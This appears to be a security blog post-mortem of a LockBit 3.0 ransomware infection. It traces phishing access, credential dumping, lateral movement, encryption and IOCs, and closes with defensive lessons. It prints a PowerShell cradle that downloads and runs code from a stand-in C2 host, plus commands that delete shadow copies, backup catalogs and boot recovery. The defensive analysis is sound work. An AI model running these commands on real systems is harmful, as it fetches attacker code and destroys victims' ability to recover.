---
layout: post
title: "Anatomy of a Ransomware Attack: LockBit 3.0 Post-Mortem"
date: 2024-01-15
tags: [Ransomware, Analysis]
excerpt: "A deep technical breakdown of how LockBit 3.0 infiltrates, moves laterally, encrypts, and extorts — traced from Point-0 to full compromise."
image: ""
---

## Overview

LockBit 3.0 — also known as LockBit Black — remains one of the most sophisticated ransomware-as-a-service operations active today. This post is a full post-mortem of a real-world infection chain, traced from initial access to double extortion.

## Initial Access — Point-0

In the incident analyzed, the intrusion began with a phishing email containing a malicious `.lnk` file disguised as an invoice PDF. Upon execution, it ran a PowerShell cradle:

```powershell
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious-c2.xyz/stage1')"
```

This downloaded and executed Cobalt Strike beacon in memory — fileless, leaving minimal forensic artifacts on disk.

## Lateral Movement

Once inside, the operators used:

- **Mimikatz** to dump LSASS credentials
- **BloodHound** for Active Directory enumeration
- **PsExec** for remote execution across domain hosts

The dwell time before encryption was **11 days** — typical for LockBit operators who prioritize data exfiltration before detonation.

## Encryption Routine

LockBit 3.0 uses a hybrid encryption model:

- **AES-256** for file content encryption
- **RSA-2048** for encrypting the AES key
- Files receive the `.lockbit` extension
- Volume Shadow Copies deleted via `vssadmin`

```bash
vssadmin.exe delete shadows /all /quiet
wbadmin delete catalog -quiet
bcdedit /set {default} recoveryenabled No
```

## Indicators of Compromise

| Type | Value |
|---|---|
| C2 Domain | malicious-c2[.]xyz |
| Hash (SHA256) | 3a4f92b1...redacted |
| Mutex | `{B1C8F3A2-...}` |
| Registry Key | `HKCU\Software\LockBit` |

## Lessons Learned

1. **Email filtering** would have caught the initial `.lnk` payload
2. **Credential tiering** limits lateral movement post-compromise
3. **Offline backups** are the only reliable ransomware recovery path
4. **EDR solutions** with behavioral detection catch the Cobalt Strike beacon

## Conclusion

LockBit 3.0 is dangerous not because of novel techniques, but because of operational discipline. The 11-day dwell time, systematic exfiltration, and clean encryption routine reflect a mature criminal enterprise. Defense requires the same discipline.

---

*Have additional IOCs or a related sample? [Reach out.](/contact)*
